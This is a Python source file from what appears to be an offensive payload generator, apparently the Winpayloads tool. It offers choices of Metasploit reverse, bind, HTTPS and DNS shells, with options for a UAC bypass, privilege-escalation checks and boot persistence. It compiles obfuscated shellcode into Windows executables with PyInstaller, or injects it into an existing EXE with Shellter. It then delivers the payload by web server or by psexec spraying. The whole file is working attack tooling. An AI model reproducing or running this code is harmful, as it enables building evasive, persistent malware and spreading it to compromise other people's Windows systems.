from main import *
from payloadextras import *
from psexecspray import *
from startmetasploit import *
from generatepayload import *
from menu import *

payloaddir = '/etc/winpayloads'


METASPLOIT_Functions = {
    'reverse': {
        'uacbypass': METASPLOIT().metrev_uac,
        'allchecks': METASPLOIT().metrev_allchecks,
        'persistence': METASPLOIT().metrev_persistence,
        'normal': METASPLOIT().metrev_normal
    },
    'bind': {
        'uacbypass': METASPLOIT().metbind_uac,
        'allchecks': METASPLOIT().metbind_allchecks,
        'persistence': METASPLOIT().metbind_persistence,
        'normal': METASPLOIT().metbind_normal
    },
    'https': {
        'uacbypass': METASPLOIT().methttps_uac,
        'allchecks': METASPLOIT().methttps_allchecks,
        'persistence': METASPLOIT().methttps_persistence,
        'normal': METASPLOIT().methttps_normal
    },
    'dns': {
        'uacbypass': METASPLOIT().metdns_uac,
        'allchecks': METASPLOIT().metdns_allchecks,
        'persistence': METASPLOIT().metdns_persistence,
        'normal': METASPLOIT().metdns_normal
    },
    'nclistener': {
        'nclisten': METASPLOIT().nclisterner,
    }
}
def askAndReturnModules(shellcode, metasploit_type):
    if metasploit_type == 'nclistener':
        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['nclisten'])

    want_UACBYPASS = raw_input(t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
    if want_UACBYPASS.lower() == 'y':
        return (EXTRAS(shellcode).UACBYPASS(), METASPLOIT_Functions[metasploit_type]['uacbypass'])

    want_ALLCHECKS = raw_input(t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
    if want_ALLCHECKS.lower() == 'y':
        return (EXTRAS(shellcode).ALLCHECKS(), METASPLOIT_Functions[metasploit_type]['allchecks'])

    want_PERSISTENCE = raw_input(t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
    if want_PERSISTENCE.lower() == 'y':
        return (EXTRAS(shellcode).PERSISTENCE(), METASPLOIT_Functions[metasploit_type]['persistence'])

    return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])

def Shellter(ez2read_shellcode):
    payloadinexe_payloaddir = raw_input(
        t.bold_green + '[*] EXE Full Filepath: ' + t.normal)
    os.chdir(os.getcwd() + '/shellter')
    with open('payloadbin', 'wb') as Csave:
        Csave.write(ez2read_shellcode)
        Csave.close()
    os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
              payloadinexe_payloaddir)
    os.system('mv %s %s'%(payloadinexe_payloaddir, payloaddir))
    os.remove(payloadinexe_payloaddir + '.bak')
    os.remove('payloadbin')
    payloadinexe_payloadname = payloadinexe_payloaddir.split('/')[-1]
    DoPayloadUpload(payloadinexe_payloadname.replace('.exe',''))


def GeneratePayload(ez2read_shellcode,payloadname):
    want_to_payloadinexe = raw_input(
        t.bold_red + '[*] Inject Shellcode into an EXE (Shellter)? y/[n]: ' + t.normal)

    if want_to_payloadinexe == 'n' or want_to_payloadinexe =='':
        with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
            Filesave.write(FUNCTIONS().DoPyCipher(
                SHELLCODE.injectwindows % (ez2read_shellcode)))
            Filesave.close()

        print '[*] Creating Payload using Pyinstaller...'
        p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
                              '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        LOADING = Spinner()
        while p.poll() == None:
            LOADING.Update()
            time.sleep(0.2)
        print '\r',
        sys.stdout.flush()

        payloadstderr = p.stderr.read()
        if re.search('error', payloadstderr.lower()):
            print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal
            sys.stdout.write(payloadstderr)
            raise KeyboardInterrupt
        os.system('mv %s/dist/payload.exe %s/%s.exe'% (payloaddir,payloaddir,payloadname))
        print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir, payloadname) + t.normal
        CleanUpPayloadMess(payloadname)
        DoPayloadUpload(payloadname)
    else:
        Shellter(ez2read_shellcode)

def CleanUpPayloadMess(payloadname):
    os.system('rm %s/logdict*' % os.getcwd())
    os.system('rm %s/dist -r' % payloaddir)
    os.system('rm %s/build -r' % payloaddir)
    os.system('rm %s/*.spec' % payloaddir)
    os.system('rm %s/payload.py' % payloaddir)

def DoPayloadUpload(payloadname):
    want_to_upload = raw_input(
        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
        DoPsexecSpray(payloaddir + '/' + payloadname)
    elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), payloadname, payloaddir)
